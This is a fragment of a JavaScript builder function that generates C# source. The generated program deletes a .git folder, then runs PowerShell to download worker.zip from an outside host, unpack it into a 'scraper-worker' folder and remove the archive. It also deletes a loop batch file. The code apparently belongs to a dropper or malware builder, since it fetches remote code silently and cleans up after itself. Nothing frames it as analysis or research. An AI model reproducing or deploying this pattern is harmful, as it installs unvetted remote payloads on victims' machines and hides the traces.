...
function buildCsCode(url, key, guild) {
    ...
    lines.push('            string legacyGit = Path.Combine(WorkDir, ".git");');
    lines.push('            if (Directory.Exists(legacyGit)) try { Directory.Delete(legacyGit, true); } catch {}');
    lines.push('            string workerPath = Path.Combine(WorkDir, "scraper-worker");');
    lines.push('            if (!Directory.Exists(workerPath)) Directory.CreateDirectory(workerPath);');
    lines.push('            string zipPath = Path.Combine(Path.GetTempPath(), "worker.zip");');
    lines.push('            RunPS("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(\'https://trackerplanilha.vercel.app/worker.zip\', \'" + zipPath + "\'); Expand-Archive -Path \'" + zipPath + "\' -DestinationPath \'" + workerPath + "\' -Force; Remove-Item \'" + zipPath + "\' -Force -ErrorAction SilentlyContinue");');
    lines.push('');
    ...
    lines.push('            if (File.Exists(loopBatPath)) { try { File.Delete(loopBatPath); } catch {} }');
    lines.push('');
